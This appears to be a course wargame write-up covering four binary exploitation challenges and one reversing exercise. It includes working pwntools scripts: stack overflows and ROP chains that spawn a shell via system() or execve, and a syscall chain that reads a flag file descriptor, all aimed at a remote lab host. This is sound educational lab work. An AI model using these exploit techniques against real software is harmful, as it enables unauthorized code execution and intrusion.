# swrop

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1zd3JvcCIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiJkZDA3NTNmNy1iNjM2LTQ4ZjctYmNhZi1mOTVkNjgyY2ZlN2UifQ.Hg41JWtmCQ9W6fuixqVcNVIxX1tkH7bgrfJXkz_FFZA}

## Scenario

The program contains a `read()` function that is vulnerable to a buffer overflow attack. The program also contains a `system()` function and `"/bin/sh"` string

## Solution

As PIE is disabled, the address of `system()` (or a call to system) can be found through static analysis. We can overflow the return address of the `vulnerable_function` function, and push the `"/bin/sh"` string address onto the stack to exploit.

## Script

```python3
from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
read(0, ebp-0x84, 0x100)
"""

p = process("./swrop")
p = remote("plsdonthaq.me", 6001)

string_binsh = 0x80485f0
# func_system = 0x8048390

payload = b""
payload += b'\x90' * (0x84 + 4) # Write up to esp

'''
Use the `call system` instruction
this method does not need an extra 4 byte padding
'''
# payload += p32(func_no_call_system)

'''
Jump into the system function
this method needs an extra 4 byte padding
'''
payload += p32(0x8048390)
payload += b'....'

payload += p32(string_binsh)

p.sendline(payload)
p.interactive()
```

# static

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1zdGF0aWMiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiNDczYjgwYjEtMmI2OC00NWY4LWIzNDctYjIzMjJjYjk4NTQwIn0.22K9FaRxPTQMA_oymzIPC7SO0smL3piS0rNnmgskwek}

## Scenario

The program contains a whole lot of library functions (embedded rather than linked). It has a vulnerable `gets()` function which allows us to overwrite the return address. There is no `"/bin/sh"` string within the binary.

## Solution

The `0x080a8cb6: pop eax; ret;` instruction does not work as it contains an `0x0a` byte (newline character) - which will cause `gets()` to finish reading. To work around this problem, we can `pop edx`, then `mov eax, edx`.

The `0x0806ee5b: push eax; adc al, 0x7c; and dword ptr [esi + 0x1a], edi; pop ebx; ret;` instruction can get around this `gets()` newline limitation, but... nah.

As there is no `"/bin/sh"` string, we will need to load it into the memory through a series of `pop ...` and `mov [...], ...` instructions.

The registers can then be modified to launch an `execve` syscall.

## Script

```python3
from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
0x80488a5 :: be_exploited()

gets(ebp-0xc)
"""

'''
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
0x8048000  0x80d7000 r-xp    8f000 0      /tmp/static
0x80d8000  0x80dc000 rw-p     4000 8f000  /tmp/static
0x80dc000  0x80dd000 rw-p     1000 0      
0x81ed000  0x820f000 rw-p    22000 0      [heap]
0xf7f33000 0xf7f36000 r--p     3000 0     [vvar]
0xf7f36000 0xf7f37000 r-xp     1000 0     [vdso]
0xffdbc000 0xffddd000 rw-p    21000 0     [stack]
'''

"""
0x08055632: mov dword ptr [eax + 4], edx; ret; 
0x0809ceb4: mov dword ptr [eax], edx; ret; 

~~~~0x080a8cb6: pop eax; ret;~~~ Doesn't work because gets() blocks the newline character

0x08064564: mov eax, edx; ret; 

0x0806ebb2: pop ecx; pop ebx; ret; 
0x0806eb8b: pop edx; ret; 
0x080496d8: pop esi; ret; 

0x08049533: int 0x80;
"""

# p = process("./static")
p = remote("plsdonthaq.me", 6002)

# Optionally `push eax; pop ebx`
# 0x0806ee5b: push eax; adc al, 0x7c; and dword ptr [esi + 0x1a], edi; pop ebx; ret;
# But this is ugly

writableAddress = 0x80d8000 # Some writeable region that stays in the same location

payload = b''
payload += b'\x90' * 0x10

# eax = edx = writableAddress
payload += p32(0x0806eb8b)      # pop edx; ret;
payload += p32(writableAddress)
payload += p32(0x08064564)      # mov eax, edx; ret;

# *eax = edx = "/bin"
payload += p32(0x0806eb8b)      # pop edx; ret; 
payload += b'/bin'
payload += p32(0x0809ceb4)      # mov dword ptr [eax], edx; ret;

# *(eax+4) = edx = "//sh"
payload += p32(0x0806eb8b)      # pop edx; ret; 
payload += b'//sh'
payload += p32(0x08055632)      # mov dword ptr [eax + 4], edx; ret; 

# eax = 0xb
payload += p32(0x0806eb8b)      # pop edx; ret;
payload += p32(0xb)
payload += p32(0x08064564)      # mov eax, edx; ret;

# ecx = 0
# ebx = writableAddress
payload += p32(0x0806ebb2)      # pop ecx; pop ebx; ret; 
payload += p32(0)
payload += p32(writableAddress)

# edx = 0
payload += p32(0x0806eb8b)      # pop edx; ret; 
payload += p32(0)

# esi = 0
payload += p32(0x080496d8)      # pop esi; ret;
payload += p32(0)

payload += p32(0x08049533)      # int 0x80;

p.sendline(payload)
p.interactive()
```

# roproprop

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1yb3Byb3Byb3AiLCJpcCI6IjIwMi44Ny4xNjIuMjgiLCJzZXNzaW9uIjoiNjM0YmE2YjUtZjgzYy00NGJhLTgwY2QtMjE2M2M1MThmYWJjIn0.QBYFtzudJR1gRfe1tslQ_kfwkRIIEnCa7XZURguYosk}

## Scenario

The program has PIE enabled, meaning that an address leak is required to calculate offsets in the program. Libc is linked to this binary, so functions and gadgets can be found from the libc library.

## Solution

The the address of `setbuf` is given, which has an offset of `0x65ff0` from the libc base. This allows us to calculate the runtime address of the `system()` function, as well as the runtime address of the `"/bin/sh"` string.

## Script

```python3
from pwn import *

'''
Arch:     i386-32-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      PIE enabled
'''

"""
read(0, ebp-0x4ca, 0x192f)
"""

# p = process("./roproprop")
p = remote("plsdonthaq.me", 6003)

# 0xf7d5a000 0xf7eb5000 r-xp   15b000 1d000  /usr/lib/i386-linux-gnu/libc-2.31.so
p.recvuntil("- ")
leak = int(p.recvuntil(" -", drop=True), 16) # ebx+0x1c || setbuf@GOT
setbuf_offset = 0x65ff0
libc_base = leak - setbuf_offset
print(f"Leaked libc base: {hex(libc_base)}")

'''
0x15ba0b: "/bin/sh\0"
0x3ada0: system()
'''

payload = b""
payload += b'\x90' * (0x4ca+4)
payload += p32(libc_base + 0x3ada0)
payload += b'....'
payload += p32(libc_base + 0x15ba0b)

p.sendline(payload)
p.interactive()
```

# ropme

> Flag: FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNi1yb3BtZSIsImlwIjoiMjAyLjg3LjE2Mi4yOCIsInNlc3Npb24iOiJlOTUzZmNlYi05MDE4LTRmMjMtYjg1NS0wM2U4OWQ3OTVhMjkifQ.qad7sr0cH0qA646PxJYZFLv2h86RyaYu7HaD1N4yWpM}

## Scenario

The binary has a vulnerable `fgets()` function; however there are few gadgets that were found which would allow us to create an `execve("/bin/sh", ...)` call. There are also few gadgets which allow us to easily manipulate the `eax`, `ecx` and `edx` registers. The flag file is however opened at `fd 3`...

## Solution

Using the `read` and `write` syscalls, we can write from the flag (`fd 3`) into a buffer located at `ecx`. Thankfully `ecx` contains the buffer used in and returned from `fgets()`. The flag can then be written out from the buffer to `stdout` (`fd 1`).

## Script

```python3
from pwn import *

'''
Arch:     i386-32-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x8048000)
'''

"""
fgets(ebp-0x8, 0x539, stdin)
"""

# p = process("./ropme")
p = remote("plsdonthaq.me", 6004)


'''
0x08048379: pop ebx; ret; 
0x080484ef: xor edx, edx; ret; 
0x08048500: mov eax, edx; mov ebx, edx; ret; 
0x080484f2: int 0x80; ret; 
'''

payload = b""
payload += b'.' * (0x8+4)

payload += p32(0x08048362) * 30 # ret;    create 30*4=120 spare bytes to use in addition to the buffer

# Read
# eax = 3 (read)
# ebx = 3 (fd)
# ecx :: ptr to buffer
# edx = 120
payload += p32(0x080484ef)        # xor edx, edx; ret; 
payload += p32(0x08048505) * 3    # inc edx; ret; * 3
payload += p32(0x08048500)        # mov eax, edx; mov ebx, edx; ret; 
payload += p32(0x08048505) * 117  # inc edx; ret; * 117
payload += p32(0x080484f2)        # int 0x80; ret; 

# eax = 4 (write)
# ebx = 1 (stdout)
# ecx :: ptr to buffer
# edx = 120
payload += p32(0x080484ef)        # xor edx, edx; ret; 
payload += p32(0x08048505) * 4    # inc edx; ret; * 4
payload += p32(0x08048500)        # mov eax, edx; mov ebx, edx; ret; 
payload += p32(0x08048379)        # pop ebx; ret;
payload += p32(1)
payload += p32(0x08048505) * 116  # inc edx; ret; * 116
payload += p32(0x080484f2)        # int 0x80; ret; 

p.sendline(payload)
p.interactive()
```

# Reversing Challenge

## Analysis

The disassembly shows a function that performs a number of memory allocation, and modifications to that memory. If a memory allocation fails, the program exits with a status code of `1`.

A struct is supposedly defined to have a `char` value and a pointer to another node (linked list!). Each time a new struct is defined, it is made the 'head' of the list, and the previous head is attached to the node. The 10 nodes are assigned a data value from 'A' to 'J' respectively.  

The program seems to have a bug, which causes the nodes in the list to unlink themselves (`mov dword ptr [eax + 4], 0`).  
This is likely Adam's fault :) and can be fixed by making the change in the below source code

```c
# OLD
node->next = 0;
---
# NEW
node->value = 0;
```

Alternatively, the statement can be removed as it is reassigned immediately after.

At the end of the loop, the head of the list is returned.

## Source Code

```c
#include <stdlib.h>

struct myStruct {
    char value;
    struct myStruct *next;
};

struct myStruct *doIt() {
    struct myStruct *var_C = NULL;
    int var_8 = 0;

    while (var_8 <= 9) {
        struct myStruct *node = malloc(sizeof(struct myStruct));
        if (node == NULL) {
            exit(1);
        }

        if (var_C == NULL) {
            var_C = node;
        } else {
            node->next = var_C;
            var_C = node;
        }

        node->next = 0; // Well this line is interesting...

        node->value = var_8 + 0x41;
        var_8++;
    }
    return var_C;
}

int main() {}
```